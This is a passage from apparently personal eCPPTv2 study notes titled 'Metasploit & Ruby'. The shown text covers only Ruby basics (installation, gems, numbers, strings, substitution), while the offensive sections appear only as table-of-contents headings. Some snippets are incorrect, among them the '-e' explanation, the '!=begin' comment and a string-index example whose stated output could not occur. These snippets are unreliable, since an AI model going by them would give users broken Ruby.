<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>7 - Metasploit &amp; Ruby |</title>
<meta name="description" content="Ruby &gt; Python ">


  <meta name="author" content="Nullified">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="">
<meta property="og:title" content="7 - Metasploit &amp; Ruby">
<meta property="og:url" content="http://localhost:4000/notes/ecppt/ruby/">


  <meta property="og:description" content="Ruby &gt; Python ">



  <meta property="og:image" content="http://localhost:4000/assets/images/main/header7.jpg">





  <meta property="article:published_time" content="2023-11-23T00:00:00+06:00">





  

  


<link rel="canonical" href="http://localhost:4000/notes/ecppt/ruby/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "john",
      "url": "http://localhost:4000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
        
        <a class="site-title" href="/">
          
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/menu">Menu</a>
            </li><li class="masthead__menu-item">
              <a href="/about">About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
  
    

    <div class="initial-content">
      
  







<div class="page__hero--overlay"
  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header7.jpg');"
>
  
    <div class="wrapper">
      <h1 id="page-title" class="page__title" itemprop="headline">
        
          7 - Metasploit &amp; Ruby

        
      </h1>
      
        <p class="page__lead">eCPPTv2
</p>
      
      
        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  110 minute read

</p>
      
      
      
    </div>
  
  
</div>





<div id="main" role="main">
  
  <div class="sidebar sticky">
  
  
    
      
      
      
      
    
    
      

<nav class="nav__list">
  
  <input id="ac-toc" name="accordion-toc" type="checkbox" />
  <label for="ac-toc">Toggle menu</label>
  <ul class="nav__items">
    
      <li>
        
          <span class="nav__sub-title">Posts</span>
        

        
        <ul>
          
            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
          
            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
          
            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
          
            <li><a href="">────────────────</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">Notes</span>
        

        
        <ul>
          
            <li><a href="/notes/ejpt/">eJPT</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/ecppt/">eCPPTv2</a></li>
          
            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
          
            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
          
            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
          
            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
          
            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
          
            <li><a href="/notes/ecppt/ruby/" class="active">- Metasploit & Ruby</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/pnpt/">PNPT</a></li>
          
            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
          
            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
          
            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
          
            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
          
            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
          
            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/eewptx/">eWPTXv2</a></li>
          
            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
          
            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
          
            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
          
            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
          
            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
          
            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
          
            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
          
            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
          
            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
          
            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
          
            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
          
            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
          
            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="">Active Directory Exploitation</a></li>
          
            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
          
            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
          
            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crtp/">CRTP</a></li>
          
            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
          
            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
          
            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
          
            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
          
            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crte/">CRTE</a></li>
          
            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
          
            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
          
            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">My CVEs</span>
        

        
        <ul>
          
            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
          
            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
          
        </ul>
        
      </li>
    
  </ul>
</nav>

    
  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="7 - Metasploit &amp; Ruby">
    <meta itemprop="description" content="eCPPTv2">
    <meta itemprop="datePublished" content="2023-11-23T00:00:00+06:00">
    

    <div class="page__inner-wrap">
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#ruby-essentials">Ruby Essentials</a>
    <ul>
      <li><a href="#installation-and-first-look">Installation and First Look</a></li>
      <li><a href="#array">Array</a></li>
      <li><a href="#ranges-and-hash">Ranges and Hash</a></li>
      <li><a href="#basic-control-structures">Basic Control Structures</a></li>
      <li><a href="#altering-structured-control-flow">Altering Structured Control Flow</a></li>
      <li><a href="#methods">Methods</a></li>
      <li><a href="#variables--scope">Variables &amp; Scope</a></li>
      <li><a href="#classes-principles">Classes Principles</a></li>
      <li><a href="#method-visibility">Method Visibility</a></li>
      <li><a href="#subclassing--inheritance">Subclassing &amp; Inheritance</a></li>
      <li><a href="#modules">Modules</a></li>
      <li><a href="#exceptions">Exceptions</a></li>
    </ul>
  </li>
  <li><a href="#pentest">Pentest</a>
    <ul>
      <li><a href="#regular-expressions">Regular Expressions</a></li>
      <li><a href="#regular-expressoins-in-the-ruby-platform">Regular expressoins in the Ruby platform</a></li>
      <li><a href="#dates-and-time">Dates and Time</a></li>
      <li><a href="#files-and-directories">Files and Directories</a></li>
    </ul>
  </li>
  <li><a href="#directory-listings">Directory Listings</a>
    <ul>
      <li><a href="#files">Files</a></li>
      <li><a href="#file-stream">File Stream</a></li>
      <li><a href="#working-with-nmap-files">Working with NMAP files</a></li>
      <li><a href="#open-ports-extraction">Open Ports Extraction</a></li>
    </ul>
  </li>
  <li><a href="#network">Network</a>
    <ul>
      <li><a href="#the-network">The Network</a></li>
      <li><a href="#sockets-basics">Sockets Basics</a></li>
      <li><a href="#ping-sweep">Ping Sweep</a></li>
      <li><a href="#raw-socket">Raw Socket</a></li>
      <li><a href="#tcp-syn-port-scanner">TCP SYN port scanner</a></li>
      <li><a href="#kernel-exec">Kernel Exec</a></li>
      <li><a href="#io-popen">IO popen</a></li>
      <li><a href="#all-together-2">All together</a></li>
      <li><a href="#lab">Lab</a></li>
    </ul>
  </li>
  <li><a href="#web">Web</a>
    <ul>
      <li><a href="#http-protocol">HTTP Protocol</a></li>
      <li><a href="#nethttp-class-and-instances">Net::HTTP class and instances</a></li>
      <li><a href="#exercises">Exercises</a></li>
    </ul>
  </li>
  <li><a href="#exploitation">Exploitation</a>
    <ul>
      <li><a href="#els-echo-server">ELS Echo Server</a></li>
      <li><a href="#writing-the-payload">Writing the Payload</a></li>
    </ul>
  </li>
  <li><a href="#metasploit">Metasploit</a>
    <ul>
      <li><a href="#introduction">Introduction</a></li>
      <li><a href="#els-echo-server-1">ELS Echo Server</a></li>
      <li><a href="#architecture-and-framework">Architecture and Framework</a></li>
      <li><a href="#interfaces">Interfaces</a></li>
      <li><a href="#libraries-1">Libraries</a></li>
      <li><a href="#modules-1">Modules</a></li>
      <li><a href="#write-a-module">Write a Module</a></li>
      <li><a href="#meterpreter-scripting">Meterpreter Scripting</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<h1 id="ruby-essentials">Ruby Essentials</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Installation 

Data Types

Control Structures

Methods, Variables and Scope

Classes, Modules and Exceptions
</code></pre></div></div>

<h2 id="installation-and-first-look">Installation and First Look</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.ruby-lang.org/
</code></pre></div></div>

<ul>
  <li>it comes pre-installed on MAC and many Linux distros like Kali.</li>
  <li>in windows you can install: http://rubyinstaller.org/</li>
</ul>

<p>Verify version:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="o">-</span><span class="n">v</span>
</code></pre></div></div>

<p>Update:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">apt</span> <span class="n">install</span> <span class="n">ruby_version</span>
</code></pre></div></div>

<p>Online ruby interpreter:</p>

<p>→ http://tryruby.org/</p>

<ul>
  <li>Ruby From other language:</li>
</ul>

<p>→ https://www.ruby-lang.org/en/documentation/ruby-from-other-languages/</p>

<h3 id="getting-started">Getting Started</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"puts 'Hello World"</span>
<span class="c1"># Output: Hello World</span>
</code></pre></div></div>

<p>// -e = echo (it shows the command directly)
// puts = print</p>

<p>You can run interactive Ruby programs using the irb tool:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">irb</span> <span class="o">--</span><span class="n">simple</span><span class="o">-</span><span class="n">prompt</span>
</code></pre></div></div>

<h3 id="suggestions">Suggestions</h3>
<ul>
  <li>If you plan to use Ruby scripts intensively, we suggest you use the bash exection shortcut (called <strong>shebang</strong>) if you are using Linux based system or associate the Ruby files on Windows.</li>
</ul>

<p>Path of your Ruby interpreter:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">which</span> <span class="n">ruby</span>
</code></pre></div></div>

<blockquote>
  <p>therefore our script must begin with the shebang</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> #!/usr/bin/ruby
</code></pre></div></div>

<h3 id="the-power-of-ruby">The power of Ruby</h3>
<p>Read files like cat:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="o">-</span><span class="n">pe</span> <span class="mi">0</span> <span class="s1">'file'</span>
</code></pre></div></div>
<p>// -pe 0 ‘file’ = read file line to line printing them to stdout and For each line it executes the 0 command</p>

<p>Count the number of the lines of a file:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="o">-</span><span class="n">ne</span> <span class="s1">'END {print "Lines:",$.,"\n"}'</span> <span class="n">file</span>

<span class="c1"># -n = puts the code into a loop</span>
<span class="c1"># -e = execute one line of ruby code</span>
<span class="c1"># print = prints the following string to stdout without a new line at the end</span>
<span class="c1"># END = executes the next block of instructions</span>
<span class="c1"># $. = global variable that holds the last line number read by ruby interpreter</span>
<span class="c1"># . = used to concatenate strings</span>
</code></pre></div></div>

<p>Replace lowercase with uppercase, and create a backup of the original:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="o">-</span><span class="n">i</span><span class="p">.</span><span class="nf">bak</span> <span class="o">-</span><span class="n">pe</span> <span class="s1">'gsub "foo","FOO"'</span> <span class="n">file_name</span>

<span class="c1"># -i = specifies in-place edit mode (edit each line read by -p instead of write it to stdout). If an extension is provided (.bak), ruby makes a backup of the original</span>
<span class="c1"># gsub = stands For global substitution (replace the first argument with the second)</span>
</code></pre></div></div>

<blockquote>
  <p>We suggest you see the Ruby man page or the Help</p>
</blockquote>

<h3 id="libraries">Libraries</h3>
<ul>
  <li>There are different sources of libraries</li>
</ul>

<p>→ the most famous: http://rubygems.org/</p>

<ul>
  <li>Its a Ruby packaging system designed to facilitate the creation, sharing and installation of libraries.</li>
  <li>Other sources: RubyForge, GitHub, Ruby Toolbox</li>
</ul>

<h3 id="rubygems">RubyGems</h3>
<ul>
  <li>gem help</li>
</ul>

<p>Search For gems:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="n">search</span> <span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;</span>
<span class="n">gem</span> <span class="n">search</span> <span class="o">-</span><span class="n">r</span> <span class="n">http</span> <span class="sr">//</span> <span class="o">-</span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span>
</code></pre></div></div>

<p>Install the gem you want:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="n">install</span> <span class="o">&lt;</span><span class="n">gem</span> <span class="nb">name</span><span class="o">&gt;</span>
<span class="n">gem</span> <span class="n">install</span> <span class="n">openssl</span><span class="o">-</span><span class="n">extensions</span>
<span class="n">gem</span> <span class="n">install</span> <span class="o">-</span><span class="n">h</span>
</code></pre></div></div>

<p>List installed gems:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="n">list</span>
</code></pre></div></div>

<p>A very useful gem is <strong>pry</strong></p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="n">install</span> <span class="n">pry</span>
<span class="sr">//</span> <span class="n">it</span> <span class="n">provides</span> <span class="n">an</span> <span class="n">interactive</span> <span class="n">environment</span> <span class="n">with</span> <span class="n">many</span> <span class="n">interesting</span> <span class="n">features</span> <span class="n">such</span> <span class="n">as</span> <span class="n">syntax</span> <span class="n">highlighting</span>
<span class="n">pry</span> <span class="o">--</span><span class="n">simple</span><span class="o">-</span><span class="n">prompt</span>
</code></pre></div></div>

<h3 id="data-types">Data Types</h3>
<ul>
  <li>everything is an object</li>
</ul>

<h4 id="numbers">Numbers</h4>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="mi">4</span><span class="p">.</span><span class="nf">odd?</span>
<span class="c1"># Output: false</span>
<span class="mi">4</span><span class="p">.</span><span class="nf">even?</span>
<span class="c1"># Output: true</span>
<span class="mi">10</span><span class="p">.</span><span class="nf">next</span>
<span class="c1"># Output: 11</span>
<span class="mi">10</span><span class="p">.</span><span class="nf">pred</span>
<span class="c1"># Output: 9</span>
<span class="mi">25</span><span class="p">.</span><span class="nf">to_s</span>
<span class="c1"># Output: "25"</span>
<span class="mi">65</span><span class="p">.</span><span class="nf">chr</span>
<span class="c1"># Output: "A"</span>
<span class="mi">15</span><span class="p">.</span><span class="nf">integer?</span>
<span class="c1"># Output: true</span>

</code></pre></div></div>

<blockquote>
  <p>In general, if a method ends with the question mark, it means that the returning value is a boolean.</p>
</blockquote>

<h4 id="float">Float</h4>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="mi">10</span><span class="o">/</span><span class="mf">3.0</span>
<span class="c1"># Output: 3.3333</span>
<span class="mf">2.0</span><span class="p">.</span><span class="nf">integer?</span>
<span class="c1"># Output: false</span>
<span class="mf">2.49</span><span class="p">.</span><span class="nf">round</span>
<span class="c1"># Output: 2</span>
<span class="mf">2.51</span><span class="p">.</span><span class="nf">round</span>
<span class="c1"># Output: 3</span>
<span class="mf">2.51</span><span class="p">.</span><span class="nf">ceil</span>
<span class="c1"># Output: 3</span>
<span class="mf">2.51</span><span class="p">.</span><span class="nf">floor</span>
<span class="c1"># Output: 2</span>

</code></pre></div></div>

<h4 id="anticipation">Anticipation</h4>
<ul>
  <li>pygmentize ip_upto.rb</li>
  <li>ruby ip_upto.rb 192.168.1 10 20</li>
  <li>//will print 192.168.10~20</li>
</ul>

<h3 id="comments">Comments</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1"># Comments ...</span>

<span class="o">!=</span><span class="k">begin</span>
  <span class="n">comments</span> <span class="k">in</span> <span class="n">between</span>
<span class="o">=</span><span class="k">end</span>

</code></pre></div></div>
<h3 id="strings">Strings</h3>
<ul>
  <li>use both single and double quotes</li>
</ul>

<p>Single quote support two escape sequences:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">\</span><span class="err">'</span> <span class="ow">and</span> <span class="p">\\</span>
</code></pre></div></div>

<p>Double quotes support a lot:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">\</span><span class="s2">" = double quote
</span><span class="se">\r</span><span class="s2"> = carriage return
</span><span class="se">\s</span><span class="s2"> = space
</span><span class="se">\\</span><span class="s2"> = single backslash
</span><span class="se">\n</span><span class="s2"> = newline
</span><span class="se">\t</span><span class="s2"> = tab
</span></code></pre></div></div>

<ul>
  <li>Also note that instead of using double or single quotes, you can use % (percent character)</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You can also use % with brackets, parenthesis, braces or &lt;&gt; signs.
</code></pre></div></div>

<ul>
  <li>Using alternative Ruby quotes (% characters and custom delimiters) you can write strings containing double or single quotes without escaping them.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="no">With</span> <span class="o">%</span><span class="n">q</span> <span class="ow">and</span> <span class="sx">%Q you </span><span class="n">can</span> <span class="n">start</span> <span class="n">respectively</span> <span class="n">strings</span> <span class="n">that</span> <span class="n">works</span> <span class="n">as</span> <span class="n">delimited</span> <span class="n">single</span> <span class="p">(</span> <span class="s1">' '</span> <span class="p">)</span> <span class="ow">and</span> <span class="n">double</span> <span class="n">quoted</span> <span class="p">(</span> <span class="s2">" "</span> <span class="p">)</span> <span class="n">strings</span><span class="p">.</span>
<span class="nf">-</span> <span class="n">both</span> <span class="o">%</span><span class="n">q</span> <span class="ow">and</span> <span class="sx">%Q need </span><span class="n">a</span> <span class="n">custom</span> <span class="n">delimiter</span> <span class="n">too</span> <span class="ow">and</span> <span class="n">you</span> <span class="n">can</span> <span class="n">also</span> <span class="n">use</span> <span class="n">the</span> <span class="n">special</span> <span class="ss">delimiters:

</span><span class="p">{},[],(),</span><span class="o">&lt;&gt;</span>

<span class="nb">print</span> <span class="sx">%q!Like single quote, \n is not interpreted as new line!</span>
<span class="nb">print</span> <span class="sx">%Q!Like double quote, </span><span class="se">\n</span><span class="sx"> is interpreted as new line!</span>
</code></pre></div></div>

<h4 id="info-about-strings">Info about strings</h4>
<ul>
  <li>You can define local variable with a lower case letter or an underscore character ( _ ) as first variable character.</li>
</ul>

<p>some examples:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">st</span> <span class="o">=</span> <span class="s2">"A string"</span>

<span class="n">st</span><span class="p">.</span><span class="nf">empty?</span>
<span class="c1"># Output: false</span>
<span class="n">st</span><span class="p">.</span><span class="nf">clear</span>
<span class="c1"># Output: ""</span>
<span class="n">st</span><span class="p">.</span><span class="nf">empty?</span>
<span class="c1"># Output: true</span>
<span class="n">st</span> <span class="o">=</span> <span class="s2">"Another string"</span>
<span class="n">st</span><span class="p">.</span><span class="nf">length</span>
<span class="c1"># Output: 14</span>
<span class="n">st</span><span class="p">.</span><span class="nf">size</span>
<span class="c1"># Output: 14</span>
<span class="n">st</span><span class="p">.</span><span class="nf">start_with?</span> <span class="s2">"An"</span>
<span class="c1"># Output: true</span>
<span class="n">st</span><span class="p">.</span><span class="nf">end_with?</span> <span class="s2">"ing"</span>
<span class="c1"># Output: true</span>
<span class="n">st</span><span class="p">.</span><span class="nf">start_with</span> <span class="s2">"an"</span>
<span class="c1"># Output: false</span>
<span class="n">st</span><span class="p">.</span><span class="nf">end_with?</span> <span class="s2">"String"</span>
<span class="c1"># Output: false</span>
</code></pre></div></div>

<p>// remember that a string is an object. You can use all the public methods provided by String and its acestor classes.
// by using <strong>pry</strong> you can display them using the autocomplete feature (pressing the tab key)</p>

<h4 id="here-document-notation">Here document notation</h4>
<ul>
  <li>Heredoc provides a mechanism For creating free format strings - preserving special characters such as new lines and tabs. This is very useful if you need to use multi-line strings.</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">st</span> <span class="o">=</span> <span class="o">&lt;&lt;</span><span class="no">DELIMITER</span><span class="sh">
  ... our 
  string,,,
</span><span class="no">DELIMITER</span>

<span class="nb">print</span> <span class="n">st</span> 
<span class="c1"># will print the multi-line string</span>

</code></pre></div></div>

<h4 id="string-arithmetic">string Arithmetic</h4>
<p>Different ways to concatenate:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># (+) Notation</span>
<span class="n">str1</span> <span class="o">=</span> <span class="s2">"Hello"</span>
<span class="n">str2</span> <span class="o">=</span> <span class="s2">"World"</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">str1</span> <span class="o">+</span> <span class="s2">" "</span> <span class="o">+</span> <span class="n">str2</span>

<span class="c1"># String Juxtaposition</span>
<span class="n">str1</span> <span class="o">=</span> <span class="s2">"Hello"</span>
<span class="n">str2</span> <span class="o">=</span> <span class="s2">"World"</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">str1</span> <span class="o">&lt;&lt;</span> <span class="s2">" "</span> <span class="o">&lt;&lt;</span> <span class="n">str2</span>

<span class="c1"># (&lt;&lt;) Notation</span>
<span class="n">str1</span> <span class="o">=</span> <span class="s2">"Hello"</span>
<span class="n">str2</span> <span class="o">=</span> <span class="s2">"World"</span>
<span class="n">str1</span> <span class="o">&lt;&lt;</span> <span class="s2">" "</span> <span class="o">&lt;&lt;</span> <span class="n">str2</span>

<span class="c1"># OO Notation with concat Method</span>
<span class="n">str1</span> <span class="o">=</span> <span class="s2">"Hello"</span>
<span class="n">str2</span> <span class="o">=</span> <span class="s2">"World"</span>
<span class="n">str1</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="s2">" "</span><span class="p">,</span> <span class="n">str2</span><span class="p">)</span>

</code></pre></div></div>

<p>You can repeate strings easily and also freeze them, so they cannot be altered:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1"># Using * for repetition</span>
<span class="s2">"string"</span> <span class="o">*</span> <span class="mi">2</span>
<span class="c1"># =&gt; "stringstring"</span>

<span class="c1"># Using &lt;&lt; for concatenation</span>
<span class="n">st</span> <span class="o">=</span> <span class="s2">"A Ruby"</span>
<span class="n">st</span> <span class="o">&lt;&lt;</span> <span class="s2">" String"</span>
<span class="c1"># =&gt; "A Ruby String"</span>

<span class="c1"># Freezing a string</span>
<span class="n">st</span><span class="p">.</span><span class="nf">freeze</span>
<span class="c1"># =&gt; "A Ruby String"</span>
<span class="c1"># The string is now frozen and cannot be modified anymore</span>

<span class="c1"># Attempting to modify a frozen string will result in an error</span>
<span class="n">st</span> <span class="o">&lt;&lt;</span> <span class="s2">"!!!"</span>
<span class="c1"># =&gt; FrozenError (can't modify frozen String)</span>

</code></pre></div></div>

<ul>
  <li>Freeze operates on an object, not on a variable that holds the pointer to the object. Therefore its legal to assign a new object to a variable that refers a frozen object. Indeed you are working with a new object.</li>
  <li>You can test if the string is frozen with <strong>frozen?</strong> method.</li>
</ul>

<h4 id="string-substitution">String substitution</h4>
<ul>
  <li>[index] method can easily change sections of strings.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">st</span> <span class="o">=</span> <span class="s2">"We are using Perl"</span>
<span class="n">st</span><span class="p">[</span><span class="s2">"Pearl"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"Ruby!!!"</span>
<span class="n">st</span>
<span class="c1"># Output: We are using Ruby!!!</span>

</code></pre></div></div>

<ul>
  <li>Another way is <strong>sub</strong> and <strong>gsub</strong></li>
</ul>

<p>The first replaces the first occurrence, while the latter replaces all the occurrences.</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">st</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="s2">"Perl"</span><span class="p">,</span><span class="s2">"Ruby"</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li><strong>sub</strong> and <strong>gsub</strong> just return a copy of the string with the proper substitution. If you want to modify the original string, you have to use <strong>sub!</strong> or <strong>gsub!</strong></li>
  <li>you cant use sub!/gsub! on a frozen object.</li>
</ul>

<p>You can insert some text into a specific position of a string:</p>
